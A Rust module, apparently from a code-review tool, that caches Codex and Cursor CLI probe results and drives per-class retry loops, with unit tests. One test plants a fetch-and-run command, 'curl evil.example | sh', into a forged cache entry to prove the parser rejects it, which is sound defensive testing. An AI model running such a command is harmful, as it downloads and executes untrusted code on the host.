//! Reviewer-probe result cache rules and probe retry-class state machines.
//!
//! The cache is a shared, cross-process artifact under the system temporary
//! directory, so every rule here is expressed over values the adapter layer
//! reads from disk rather than over paths. Retry limits stay separated by
//! failure class: authentication, transient, and timeout each carry their own
//! budget, and a no-retry class stops the loop immediately.

use crate::{CodexEnvAuth, CodexGateDetail, CodexGateSignal, ExitCode, detect_codex_cli_gate};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::{fmt::Write as _, time::Duration};

/// Exit code a probe attempt reports for a proven credential failure.
pub const PROBE_AUTH_RETRY_RC: i32 = 2;

/// Exit code a probe attempt reports for a failure no retry can clear.
pub const PROBE_NO_RETRY_RC: i32 = 3;

/// Exit code a probe attempt reports for a retryable transient failure.
pub const PROBE_TRANSIENT_RC: i32 = 1;

/// Shortest gate-detail lifetime, used when the positive TTL is disabled.
pub const CODEX_PROBE_GATE_IMMEDIATE_TTL: Duration = Duration::from_secs(5);

/// Wire version of the cached Codex gate-detail payload.
const GATE_DETAIL_SCHEMA_VERSION: u8 = 1;

/// Fixed diagnostic used to re-derive a cached gate detail's canonical shape.
const GATE_DETAIL_CANONICAL_DIAGNOSTIC: &str = "requires a newer version of Codex";

/// Length of the model digest embedded in a Codex probe identity.
const IDENTITY_DIGEST_CHARS: usize = 16;

/// Positive and negative lifetimes for one cached probe verdict.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct ProbeTtl {
    positive: Duration,
    negative: Duration,
}

impl ProbeTtl {
    /// Build a lifetime pair from resolved second counts.
    #[must_use]
    pub const fn from_seconds(positive: u64, negative: u64) -> Self {
        Self {
            positive: Duration::from_secs(positive),
            negative: Duration::from_secs(negative),
        }
    }

    /// Return whether any cached verdict may be reused.
    #[must_use]
    pub const fn caching_enabled(&self) -> bool {
        !self.positive.is_zero()
    }

    /// Return the age ceiling for a gate detail read beside a fresh probe.
    ///
    /// The failing-probe path pins the floor at the immediate TTL so a gate
    /// detail stays readable even when negative caching is off.
    #[must_use]
    pub fn immediate_gate_max_age(&self) -> Duration {
        self.negative.max(CODEX_PROBE_GATE_IMMEDIATE_TTL)
    }

    /// Return the age ceiling for a gate detail read outside a probe.
    #[must_use]
    pub fn standalone_gate_max_age(&self) -> Duration {
        let positive = if self.positive.is_zero() {
            CODEX_PROBE_GATE_IMMEDIATE_TTL
        } else {
            self.positive
        };
        self.negative.max(positive)
    }
}

/// Decide whether a stamp file's contents are a reusable verdict.
///
/// `age` is `None` when the stamp is absent, is not a regular file, or carries
/// a future timestamp; none of those is ever reused. A cached failure
/// additionally requires negative caching to be enabled and the stamp to sit
/// inside the shorter negative lifetime.
#[must_use]
pub fn fresh_probe_verdict(contents: &str, age: Option<Duration>, ttl: &ProbeTtl) -> Option<bool> {
    if !ttl.caching_enabled() {
        return None;
    }
    let age = age?;
    if age > ttl.positive {
        return None;
    }
    match contents.lines().next()?.replace('\r', "").as_str() {
        "true" => Some(true),
        "false" if !ttl.negative.is_zero() && age <= ttl.negative => Some(false),
        _ => None,
    }
}

/// Render the single line a probe stamp file stores.
#[must_use]
pub fn probe_stamp_contents(present: bool) -> String {
    format!("{present}\n")
}

/// Sanitize a user name into the probe cache's filename component.
#[must_use]
pub fn probe_cache_user(raw: Option<&str>) -> String {
    let sanitized: String = raw
        .unwrap_or_default()
        .chars()
        .filter(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '.' | '_' | '-')
        })
        .collect();
    if sanitized.is_empty() {
        "larch".to_owned()
    } else {
        sanitized
    }
}

/// Return the probe stamp filename for one probe kind.
#[must_use]
pub fn probe_stamp_file_name(kind: &str, user: &str) -> String {
    format!("larch-{kind}-present-{user}.stamp")
}

/// Return the Codex gate-detail cache filename for one probe identity.
#[must_use]
pub fn codex_gate_detail_file_name(identity: &str, user: &str) -> String {
    format!("larch-{identity}-gate-{user}.json")
}

/// Return the exclusive Codex probe update-lock filename for one identity.
#[must_use]
pub fn codex_probe_update_lock_file_name(identity: &str, user: &str) -> String {
    format!("larch-{identity}-probe-{user}.lock")
}

/// Derive the cache identity for a Codex probe.
///
/// The identity binds a cached verdict to both the authentication mode and the
/// resolved review model, so switching either re-probes instead of reusing a
/// verdict produced under different inputs.
#[must_use]
pub fn codex_probe_identity(auth: CodexEnvAuth, model: &str) -> String {
    let mode = match auth {
        CodexEnvAuth::Include => "env-key",
        CodexEnvAuth::Omit => "login",
    };
    let hex = Sha256::digest(model.as_bytes())
        .iter()
        .take(IDENTITY_DIGEST_CHARS / 2)
        .fold(
            String::with_capacity(IDENTITY_DIGEST_CHARS),
            |mut text, byte| {
                let _written = write!(text, "{byte:02x}");
                text
            },
        );
    format!("codex-{mode}-{hex}")
}

#[derive(Deserialize, Serialize)]
struct GateDetailPayload {
    schema_version: u8,
    identity: String,
    model: String,
    signal: String,
    message: String,
}

/// Render the cached gate-detail payload for one identity.
#[must_use]
pub fn render_codex_gate_detail(identity: &str, detail: &CodexGateDetail) -> String {
    let payload = GateDetailPayload {
        schema_version: GATE_DETAIL_SCHEMA_VERSION,
        identity: identity.to_owned(),
        model: detail.model().to_owned(),
        signal: detail.signal().as_str().to_owned(),
        message: detail.message().to_owned(),
    };
    serde_json::to_string(&payload).map_or_else(|_error| String::new(), |text| text + "\n")
}

/// Parse a cached gate-detail payload, rejecting anything not self-consistent.
///
/// The stored message and model are re-derived from the canonical gate
/// renderer, so a hand-edited or corrupted cache entry cannot inject arbitrary
/// operator-facing text through the degraded-tools explanation.
#[must_use]
pub fn parse_codex_gate_detail(text: &str, identity: &str) -> Option<CodexGateDetail> {
    let payload: GateDetailPayload = serde_json::from_str(text).ok()?;
    if payload.schema_version != GATE_DETAIL_SCHEMA_VERSION || payload.identity != identity {
        return None;
    }
    let signal = parse_gate_signal(&payload.signal)?;
    let expected = detect_codex_cli_gate(GATE_DETAIL_CANONICAL_DIAGNOSTIC, &payload.model)?;
    if payload.model != expected.model() || payload.message != expected.message() {
        return None;
    }
    Some(CodexGateDetail::new(payload.model, signal, payload.message))
}

fn parse_gate_signal(token: &str) -> Option<CodexGateSignal> {
    [
        CodexGateSignal::ModelMetadataNotFound,
        CodexGateSignal::NewerCodexRequired,
    ]
    .into_iter()
    .find(|signal| signal.as_str() == token)
}

/// Retry budgets separated by probe failure class.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct ProbeRetryLimits {
    auth: usize,
    transient: usize,
    timeout: usize,
}

impl ProbeRetryLimits {
    /// Build limits from resolved attempt counts.
    #[must_use]
    pub const fn new(auth: usize, transient: usize, timeout: usize) -> Self {
        Self {
            auth,
            transient,
            timeout,
        }
    }

    /// Return the maximum authentication failures a probe loop tolerates.
    #[must_use]
    pub const fn auth_attempts(&self) -> usize {
        if self.auth == 0 { 1 } else { self.auth }
    }

    /// Return the transient-failure retry budget.
    #[must_use]
    pub const fn transient(&self) -> usize {
        self.transient
    }

    /// Return the timeout retry budget.
    #[must_use]
    pub const fn timeout(&self) -> usize {
        self.timeout
    }

    /// Collapse the retry budget after a preflight already proved auth failure.
    ///
    /// One authentication attempt and no transient retries keep a known-bad
    /// credential from burning the full budget on a certain failure.
    #[must_use]
    pub const fn after_failed_preflight(&self) -> Self {
        Self {
            auth: 1,
            transient: 0,
            timeout: self.timeout,
        }
    }
}

/// Resolve the transient retry budget from the operator override and auth budget.
#[must_use]
pub const fn transient_probe_retries(override_value: Option<usize>, auth_attempts: usize) -> usize {
    match override_value {
        Some(value) => value,
        None if auth_attempts == 1 => 0,
        None => 2,
    }
}

/// Terminal state of one probe loop.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct ProbeConclusion {
    present: bool,
    timed_out: bool,
}

impl ProbeConclusion {
    /// Return whether the vendor answered the probe successfully.
    #[must_use]
    pub const fn present(&self) -> bool {
        self.present
    }

    /// Return whether the loop ended on an exhausted timeout budget.
    #[must_use]
    pub const fn timed_out(&self) -> bool {
        self.timed_out
    }
}

/// Whether a probe loop runs another attempt or stops.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum ProbeStep {
    /// Run one more probe attempt.
    Retry,
    /// Stop with this conclusion.
    Stop(ProbeConclusion),
}

/// One completed Codex probe attempt.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct CodexProbeAttempt {
    rc: i32,
    gate_detail: Option<CodexGateDetail>,
}

impl CodexProbeAttempt {
    /// Record an attempt that produced no CLI gate.
    #[must_use]
    pub const fn from_exit(rc: i32) -> Self {
        Self {
            rc,
            gate_detail: None,
        }
    }

    /// Record an attempt whose diagnostics proved a Codex CLI gate.
    ///
    /// A gate is terminal, so it carries the no-retry exit code.
    #[must_use]
    pub const fn from_gate(gate_detail: CodexGateDetail) -> Self {
        Self {
            rc: PROBE_NO_RETRY_RC,
            gate_detail: Some(gate_detail),
        }
    }

    /// Return the attempt exit code.
    #[must_use]
    pub const fn rc(&self) -> i32 {
        self.rc
    }
}

/// Codex probe retry driver with per-class budgets.
#[derive(Clone, Debug)]
pub struct CodexProbeLoop {
    limits: ProbeRetryLimits,
    auth_used: usize,
    transient_used: usize,
    timeout_used: usize,
    gate_detail: Option<CodexGateDetail>,
}

impl CodexProbeLoop {
    /// Start a loop with the resolved budgets.
    #[must_use]
    pub const fn new(limits: ProbeRetryLimits) -> Self {
        Self {
            limits,
            auth_used: 0,
            transient_used: 0,
            timeout_used: 0,
            gate_detail: None,
        }
    }

    /// Fold one attempt into the loop and decide the next step.
    pub fn observe(&mut self, attempt: CodexProbeAttempt) -> ProbeStep {
        if let Some(detail) = attempt.gate_detail {
            self.gate_detail = Some(detail);
            return stop(false, false);
        }
        if attempt.rc == 0 {
            return stop(true, false);
        }
        let (used, limit) = match attempt.rc {
            code if code == ExitCode::Timeout.value() => {
                (&mut self.timeout_used, self.limits.timeout())
            }
            PROBE_AUTH_RETRY_RC => (
                &mut self.auth_used,
                self.limits.auth_attempts().saturating_sub(1),
            ),
            PROBE_TRANSIENT_RC => (&mut self.transient_used, self.limits.transient()),
            _ => return stop(false, false),
        };
        if *used < limit {
            *used += 1;
            return ProbeStep::Retry;
        }
        stop(false, attempt.rc == ExitCode::Timeout.value())
    }

    /// Return the gate detail proved by the loop, when any.
    #[must_use]
    pub const fn gate_detail(&self) -> Option<&CodexGateDetail> {
        self.gate_detail.as_ref()
    }
}

/// Cursor probe retry driver with per-class budgets.
#[derive(Clone, Copy, Debug)]
pub struct CursorProbeLoop {
    limits: ProbeRetryLimits,
    auth_failures: usize,
    transient_used: usize,
    timeout_used: usize,
}

impl CursorProbeLoop {
    /// Start a loop with the resolved budgets.
    #[must_use]
    pub const fn new(limits: ProbeRetryLimits) -> Self {
        Self {
            limits,
            auth_failures: 0,
            transient_used: 0,
            timeout_used: 0,
        }
    }

    /// Fold one attempt exit code into the loop and decide the next step.
    pub const fn observe(&mut self, rc: i32) -> ProbeStep {
        if rc == ExitCode::Timeout.value() {
            if self.timeout_used < self.limits.timeout() {
                self.timeout_used += 1;
                return ProbeStep::Retry;
            }
            return stop(false, true);
        }
        match rc {
            0 => stop(true, false),
            PROBE_AUTH_RETRY_RC => {
                self.auth_failures += 1;
                if self.auth_failures >= self.limits.auth_attempts() {
                    return stop(false, false);
                }
                ProbeStep::Retry
            }
            PROBE_TRANSIENT_RC => {
                if self.transient_used >= self.limits.transient() {
                    return stop(false, false);
                }
                self.transient_used += 1;
                ProbeStep::Retry
            }
            _ => stop(false, false),
        }
    }
}

const fn stop(present: bool, timed_out: bool) -> ProbeStep {
    ProbeStep::Stop(ProbeConclusion { present, timed_out })
}

#[cfg(test)]
mod tests {
    use super::{
        CODEX_PROBE_GATE_IMMEDIATE_TTL, CodexEnvAuth, CodexProbeAttempt, CodexProbeLoop,
        CursorProbeLoop, PROBE_AUTH_RETRY_RC, PROBE_NO_RETRY_RC, PROBE_TRANSIENT_RC,
        ProbeRetryLimits, ProbeStep, ProbeTtl, codex_gate_detail_file_name, codex_probe_identity,
        codex_probe_update_lock_file_name, detect_codex_cli_gate, fresh_probe_verdict,
        parse_codex_gate_detail, probe_cache_user, probe_stamp_contents, probe_stamp_file_name,
        render_codex_gate_detail, transient_probe_retries,
    };
    use crate::ExitCode;
    use std::time::Duration;

    fn ttl(positive: u64, negative: u64) -> ProbeTtl {
        ProbeTtl::from_seconds(positive, negative)
    }

    #[test]
    fn positive_verdicts_are_reused_inside_the_ttl_and_dropped_after_it() {
        let positive_only = ttl(60, 0);
        assert_eq!(
            fresh_probe_verdict("true\n", Some(Duration::from_secs(59)), &positive_only),
            Some(true)
        );
        assert_eq!(
            fresh_probe_verdict("true\n", Some(Duration::from_secs(61)), &positive_only),
            None
        );
    }

    #[test]
    fn negative_verdicts_need_their_own_shorter_lifetime() {
        let with_negative = ttl(60, 10);
        assert_eq!(
            fresh_probe_verdict("false\n", Some(Duration::from_secs(9)), &with_negative),
            Some(false)
        );
        assert_eq!(
            fresh_probe_verdict("false\n", Some(Duration::from_secs(30)), &with_negative),
            None
        );
        assert_eq!(
            fresh_probe_verdict("false\n", Some(Duration::from_secs(1)), &ttl(60, 0)),
            None
        );
    }

    #[test]
    fn unreadable_stale_or_disabled_stamps_never_produce_a_verdict() {
        assert_eq!(
            fresh_probe_verdict("true\n", Some(Duration::ZERO), &ttl(0, 0)),
            None
        );
        assert_eq!(fresh_probe_verdict("true\n", None, &ttl(60, 10)), None);
        assert_eq!(
            fresh_probe_verdict("maybe\n", Some(Duration::ZERO), &ttl(60, 10)),
            None
        );
        assert_eq!(
            fresh_probe_verdict("", Some(Duration::ZERO), &ttl(60, 10)),
            None
        );
        assert_eq!(
            fresh_probe_verdict("true\r\n", Some(Duration::ZERO), &ttl(60, 10)),
            Some(true)
        );
    }

    #[test]
    fn stamp_contents_stay_lowercase_single_line() {
        assert_eq!(probe_stamp_contents(true), "true\n");
        assert_eq!(probe_stamp_contents(false), "false\n");
    }

    #[test]
    fn cache_file_names_are_user_scoped_and_sanitized() {
        assert_eq!(probe_cache_user(Some("../root")), "..root");
        assert_eq!(probe_cache_user(Some("")), "larch");
        assert_eq!(probe_cache_user(None), "larch");
        assert_eq!(probe_cache_user(Some("/")), "larch");
        assert_eq!(
            probe_stamp_file_name("cursor", "ada"),
            "larch-cursor-present-ada.stamp"
        );
        assert_eq!(
            codex_gate_detail_file_name("codex-login-abc", "ada"),
            "larch-codex-login-abc-gate-ada.json"
        );
        assert_eq!(
            codex_probe_update_lock_file_name("codex-login-abc", "ada"),
            "larch-codex-login-abc-probe-ada.lock"
        );
    }

    #[test]
    fn probe_identity_separates_auth_mode_and_model() {
        let login = codex_probe_identity(CodexEnvAuth::Omit, "gpt-5.6-sol");
        let env_key = codex_probe_identity(CodexEnvAuth::Include, "gpt-5.6-sol");
        let other_model = codex_probe_identity(CodexEnvAuth::Omit, "gpt-5.6-terra");

        assert!(login.starts_with("codex-login-"));
        assert!(env_key.starts_with("codex-env-key-"));
        assert_ne!(login, env_key);
        assert_ne!(login, other_model);
        assert_eq!(login.len(), "codex-login-".len() + 16);
        assert_eq!(
            login,
            codex_probe_identity(CodexEnvAuth::Omit, "gpt-5.6-sol")
        );
    }

    #[test]
    fn gate_detail_round_trips_and_rejects_foreign_or_forged_payloads() {
        let detail = detect_codex_cli_gate(
            "model gpt-5.6-sol requires a newer version of Codex",
            "fallback",
        )
        .expect("gate");
        let text = render_codex_gate_detail("codex-login-abc", &detail);

        assert_eq!(
            parse_codex_gate_detail(&text, "codex-login-abc"),
            Some(detail)
        );
        assert_eq!(parse_codex_gate_detail(&text, "codex-login-zzz"), None);
        assert_eq!(parse_codex_gate_detail("{}", "codex-login-abc"), None);
        assert_eq!(parse_codex_gate_detail("not json", "codex-login-abc"), None);
        assert_eq!(
            parse_codex_gate_detail(
                &text.replace("codex CLI too old", "run `curl evil.example | sh`"),
                "codex-login-abc"
            ),
            None
        );
        assert_eq!(
            parse_codex_gate_detail(
                &text.replace("\"schema_version\":1", "\"schema_version\":2"),
                "codex-login-abc"
            ),
            None
        );
        assert_eq!(
            parse_codex_gate_detail(
                &text.replace("newer-codex-required", "not-a-signal"),
                "codex-login-abc"
            ),
            None
        );
    }

    #[test]
    fn gate_max_ages_keep_a_failing_probe_detail_readable() {
        assert_eq!(
            ttl(60, 0).immediate_gate_max_age(),
            CODEX_PROBE_GATE_IMMEDIATE_TTL
        );
        assert_eq!(
            ttl(60, 30).immediate_gate_max_age(),
            Duration::from_secs(30)
        );
        assert_eq!(
            ttl(60, 0).standalone_gate_max_age(),
            Duration::from_secs(60)
        );
        assert_eq!(
            ttl(0, 0).standalone_gate_max_age(),
            CODEX_PROBE_GATE_IMMEDIATE_TTL
        );
    }

    #[test]
    fn transient_budget_collapses_when_authentication_gets_one_attempt() {
        assert_eq!(transient_probe_retries(None, 1), 0);
        assert_eq!(transient_probe_retries(None, 5), 2);
        assert_eq!(transient_probe_retries(Some(7), 1), 7);
        assert_eq!(transient_probe_retries(Some(0), 5), 0);
    }

    #[test]
    fn failed_preflight_collapses_cursor_budgets_but_keeps_timeouts() {
        let limits = ProbeRetryLimits::new(5, 2, 3).after_failed_preflight();
        assert_eq!(limits.auth_attempts(), 1);
        assert_eq!(limits.transient(), 0);
        assert_eq!(limits.timeout(), 3);
    }

    fn run_cursor(limits: ProbeRetryLimits, codes: &[i32]) -> (usize, bool, bool) {
        let mut loop_state = CursorProbeLoop::new(limits);
        for (attempts, code) in codes.iter().enumerate() {
            if let ProbeStep::Stop(conclusion) = loop_state.observe(*code) {
                return (attempts + 1, conclusion.present(), conclusion.timed_out());
            }
        }
        panic!("cursor probe loop never stopped");
    }

    #[test]
    fn cursor_loop_separates_auth_transient_and_timeout_budgets() {
        let limits = ProbeRetryLimits::new(3, 2, 1);
        assert_eq!(run_cursor(limits, &[0]), (1, true, false));
        assert_eq!(
            run_cursor(
                limits,
                &[
                    PROBE_AUTH_RETRY_RC,
                    PROBE_AUTH_RETRY_RC,
                    PROBE_AUTH_RETRY_RC
                ]
            ),
            (3, false, false)
        );
        assert_eq!(
            run_cursor(
                limits,
                &[PROBE_TRANSIENT_RC, PROBE_TRANSIENT_RC, PROBE_TRANSIENT_RC]
            ),
            (3, false, false)
        );
        assert_eq!(
            run_cursor(
                limits,
                &[ExitCode::Timeout.value(), ExitCode::Timeout.value()]
            ),
            (2, false, true)
        );
        assert_eq!(run_cursor(limits, &[PROBE_NO_RETRY_RC]), (1, false, false));
        assert_eq!(
            run_cursor(limits, &[PROBE_AUTH_RETRY_RC, PROBE_TRANSIENT_RC, 0]),
            (3, true, false)
        );
    }

    fn run_codex(limits: ProbeRetryLimits, codes: &[i32]) -> (usize, bool, bool) {
        let mut loop_state = CodexProbeLoop::new(limits);
        for (attempts, code) in codes.iter().enumerate() {
            if let ProbeStep::Stop(conclusion) =
                loop_state.observe(CodexProbeAttempt::from_exit(*code))
            {
                return (attempts + 1, conclusion.present(), conclusion.timed_out());
            }
        }
        panic!("codex probe loop never stopped");
    }

    #[test]
    fn codex_loop_separates_auth_transient_and_timeout_budgets() {
        let limits = ProbeRetryLimits::new(3, 2, 1);
        assert_eq!(run_codex(limits, &[0]), (1, true, false));
        assert_eq!(
            run_codex(
                limits,
                &[
                    PROBE_AUTH_RETRY_RC,
                    PROBE_AUTH_RETRY_RC,
                    PROBE_AUTH_RETRY_RC
                ]
            ),
            (3, false, false)
        );
        assert_eq!(
            run_codex(
                limits,
                &[PROBE_TRANSIENT_RC, PROBE_TRANSIENT_RC, PROBE_TRANSIENT_RC]
            ),
            (3, false, false)
        );
        assert_eq!(
            run_codex(
                limits,
                &[ExitCode::Timeout.value(), ExitCode::Timeout.value()]
            ),
            (2, false, true)
        );
        assert_eq!(run_codex(limits, &[PROBE_NO_RETRY_RC]), (1, false, false));
    }

    #[test]
    fn codex_gate_stops_the_loop_and_is_reported_once() {
        let detail = detect_codex_cli_gate(
            "model gpt-5.6-sol requires a newer version of Codex",
            "fallback",
        )
        .expect("gate");
        let mut loop_state = CodexProbeLoop::new(ProbeRetryLimits::new(5, 2, 2));

        let step = loop_state.observe(CodexProbeAttempt::from_gate(detail.clone()));

        assert_eq!(
            step,
            ProbeStep::Stop(super::ProbeConclusion {
                present: false,
                timed_out: false
            })
        );
        assert_eq!(loop_state.gate_detail(), Some(&detail));
        assert_eq!(CodexProbeAttempt::from_gate(detail).rc(), PROBE_NO_RETRY_RC);
    }
}
